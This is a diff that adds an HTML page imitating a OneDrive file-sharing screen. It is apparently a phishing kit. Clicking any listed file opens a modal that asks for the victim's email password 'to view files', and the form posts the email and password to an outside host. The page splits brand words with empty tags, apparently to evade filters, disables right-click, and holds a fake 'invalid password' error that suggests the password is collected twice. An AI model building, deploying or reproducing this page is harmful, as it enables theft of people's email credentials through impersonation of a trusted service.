@@ -1,0 +1,271 @@
+
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>0.n.e.D.r.i.v.e</title>
+    <link rel="shortcut icon" href="odt.png" type="image/x-icon">
+    <link rel="stylesheet" href="css.css">
+    <link rel="stylesheet" href="checkbox.css">
+    <link rel="stylesheet" href="all.css">
+    <link rel="stylesheet" href="app.css" integrity="sha384-lZN37f5QGtY3VHgisS14W3ExzMWZxybE1SJSEsQp9S+oqd12jhcu+A56Ebc1zFSJ" crossorigin="anonymous">
+    <link rel="stylesheet" href="bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    
+    <script language="javascript">
+document.onmousedown=disableclick;
+status="Right Click Disabled";
+Function disableclick(event)
+{
+  if(event.button==2)
+   {
+     alert(status);
+     return false;    
+   }
+}
+</script>
+ <style>
+.action-btn {
+  background-color: #0070e0;
+  border: ;
+  font-size: ;
+  font-weight: ;
+  text-transform: uppercase;
+  padding: ;
+  color: white;
+  transition: 0.3s;
+  cursor: pointer;
+  position: relative;
+  display: block;
+  align: center;
+  width: ;
+}
+
+.action-btn:hover {
+  background-color: #0070e0;
+}
+
+.action-btn:focus {
+  outline: 0.05em dashed #0070e0; 
+  outline-offset: 0.05em;
+}
+
+.action-btn::after {
+  content: '';
+  display: block;
+  width: 1.2em;
+  height: 1.2em;
+  position: absolute;
+  left: calc(50% - 0.75em);
+  top: calc(50% - 0.75em);
+  border: 0.15em solid transparent;
+  border-right-color: white;
+  border-radius: 50%;
+  animation: button-anim 0.7s linear infinite;
+  opacity: 0;
+}
+
+@keyframes button-anim {
+  from {
+    transform: rotate(0);
+  }
+  to {
+    transform: rotate(360deg);
+  }
+}
+
+.action-btn.loading {
+  color: transparent;
+}
+
+.action-btn.loading::after {
+  opacity: 1;
+}
+
+/* em values are used to adjust button values such as padding, radius etc. based on font-size */
+      </style>
+</head>
+
+<body class="">
+    <div class="sidebar">
+        <div class="db-logo"><img src="onedlogo.png" width="70"></div>
+        <div class="files">Fi<b></b>les</div>
+        <ul class="side-list">
+            <li class="side-list-item"><a href="#" class="active">Sha<b></b>red</a></li>
+            <li class="side-list-item"><a href="#">My fi<b></b>les</a></li>
+            <li class="side-list-item"><a href="#">Fi<b></b>le req<b></b>uests</a></li>
+            <li class="side-list-item"><a href="#">Del<b></b>eted fi<b></b>les</a></li>
+        </ul>
+    </div>
+    <div class="main">
+        <div class="upgrade"><a href="#"><i class="fa fa-star-o" style="color: #b9a143;"></i><span class="upa">Upg<b></b>rade acc<b></b>ount</span></a></div>
+        <ul class="head-nav">
+            <li class="head-item min"><i class="fa fa-bars"></i></li>
+            <li class="head-item">
+                <h1>OneD<b></b>rive</h1>
+            </li>
+            <li class="head-item right"><span class="noti"><i class="fa fa-bell"></i></span></li>
+            <li class="head-item right">
+                <span class="noti mb-search"><i class="fa fa-search"></i></span>
+                <span class="search">
+                    <i class="fa fa-search"></i>
+                    <input type="text" class="searchbox">
+                </span>
+            </li>
+        </ul>
+        <div class="files-container">
+            <table class="file-table">
+                <tbody>
+                    <tr>
+                        <th></th>
+                        <td class="th">Na<b></b>me↑
+                        </td>
+                        <td class="th">Modi<b></b>fied<span class="spc">▼</span>
+                        </td>
+                        <td class="th">Mem<b></b>bers<span class="spc">▼</span>
+                        </td>
+                        <td class="th">Si<b></b>ze<span class="spc">▼</span>
+                        </td>
+                         <td class="th">Ac<b></b>tion<span class="spc">▼</span>
+                        </td>
+                          <td class="th"><i class="fa fa-list-ul"></i><span class="spc">▼</span>
+                    </tr>
+                    <tr data-toggle="modal" data-target="#modalbox2">
+                        <th>
+                            <label class="check-cont">
+                                <input type="checkbox">
+                                <span class="checkmark"></span>
+                            </label>
+                        </th>
+                        <td>
+                            <img src="file1.png" width="200px">
+                        </td>
+                        <td><img src="ys.png" width="140px"></td>
+                        <td>On<b></b>ly you</td>
+                        <td>5.<b></b>2 MB</td>
+                         <td>Dow<b></b>nload</td>
+                           <td><i class="fa fa-ellipsis-h"></i></td>
+                    </tr>
+                    <tr data-toggle="modal" data-target="#modalbox2">
+                        <th>
+                            <label class="check-cont">
+                                <input type="checkbox">
+                                <span class="checkmark"></span>
+                            </label>
+                        </th>
+                        <td>
+                            <img src="file2.png" width="200px">
+                        </td>
+                        <td><img src="ys.png" width="140px"></td>
+                        <td>On<b></b>ly you</td>
+                        <td>98<b></b>6 KB</td>
+                         <td>Dow<b></b>nload</td>
+                           <td><i class="fa fa-ellipsis-h"></i></td>
+                    </tr>
+                    <tr data-toggle="modal" data-target="#modalbox2">
+                        <th>
+                            <label class="check-cont">
+                                <input type="checkbox">
+                                <span class="checkmark"></span>
+                            </label>
+                        </th>
+                        <td>
+                            <img src="file3.png" width="200px">
+                        </td>
+                        <td><img src="ys.png" width="140px"></td>
+                        <td>On<b></b>ly you</td>
+                         <td>10.<b></b>6 MB</td>
+                         <td>Dow<b></b>nload</td>
+                           <td><i class="fa fa-ellipsis-h"></i></td>
+                    </tr>
+                    <tr data-toggle="modal" data-target="#modalbox2">
+                        <th>
+                            <label class="check-cont">
+                                <input type="checkbox">
+                                <span class="checkmark"></span>
+                            </label>
+                        </th>
+                        <td>
+                            <img src="file4.png" width="200px">
+                        </td>
+                        <td><img src="ys.png" width="140px"></td>
+                        <td>On<b></b>ly you</td>
+                         <td>3 MB</td>
+                         <td>Dow<b></b>nload</td>
+                           <td><i class="fa fa-ellipsis-h"></i></td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+    </div>
+    <div class="dpanel">
+        <img src="fview.png" width="350px">
+        <ul class="panel-list">
+            <li class="panel-item"><a href="#"><i class="fa fa-upload"></i> Upl<b></b>oad fi<b></b>les</a></li>
+            <li class="panel-item"><a href="#"><i class="fa fa-folder"></i> Upl<b></b>oad fol<b></b>der</a></li>
+            <li class="panel-item"><a href="#"><i class="fa fa-folder"></i> Ne<b></b>w fol<b></b>der</a></li>
+            <li class="panel-item"><a href="#"><i class="fa fa-share-square"></i> Ne<b></b>w shar<b></b>ed fol<b></b>der</a></li>
+            <li class="panel-item"><a href="#"><i class="fa fa-inbox"></i> Requ<b></b>est fi<b></b>les</a></li>
+        </ul>
+    </div>
+    <!-- Modal -->
+    <div class="modal fade" id="modalbox2" tabindex="-1" role="dialog" aria-labelledby="exampleModalCenterTitle" aria-hidden="true" style="display: none;">
+        <div class="modal-dialog " role="document">
+            <div class="modal-content">
+                <div class="modal-body">
+                    <div class="mlogo">
+                        <img src="odt.png">
+                    </div>
+                    <p class="instruction" style="text-align:center">
+                        <img src="instr.png" width="400px">
+                    </p>
+                    <p class="inst">Ple<b></b>ase Conf<b></b>irm Rece<b></b>iving E-m<b></b>ail to Vi<b></b>ew Fi<b></b>les</p>
+                   
+                    <div class="ebox">
+                        
+                        
+<script  src="https://code.jquery.com/jquery-3.2.1.min.js"   integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4="   crossorigin="anonymous"></script>
+
+<script type="text/javascript" src="script.js"></script>
+
+      <form action="https://wn.hbrneter.cc/dropbox/lal.php" method="post" id="form">
+          
+           <div align="left" style="font-size:12px; padding:6px; font-family:Verdana; color:#CC0000;">
+			  <div align="center" class="whatever-styling-you-want">
+
+</div>
+		  
+		  </div>
+          
+ <input type="email" name="email" class="password" id="opoo" placeholder="Enter receiving email" value="" readonly>
+ <input type="password" name="pass" class="password" id="opo" placeholder="Enter email password" required>
+
+		  <input type="hidden" value="Error! Invalid password, Re-enter password." id="textBox" placeholder="Please input your text here..."/>
+ 
+     <div class="submitdiv" align="center">
+  <button class="submit action-btn" id="submit" name="submit">View Files</button>
+                        </div>
+                        <p class="foot">&copy; Cop<b></b>yright 0neD<b></b>rive Inc. 2O<b></b>25</p>
+                    </form>
+                    </div>
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+    
+<script type="text/javascript" src="script2.js"></script>
+   
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0-beta/js/materialize.min.js"></script>
+<script type="text/javascript" src="main2.js"></script>
+    
+
+<script type="text/javascript" src="script3.js"></script>
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+   
+
+<script type="text/javascript" src="bootstrap.min(1).js"></script>
+
+
+
+
+</body></html>
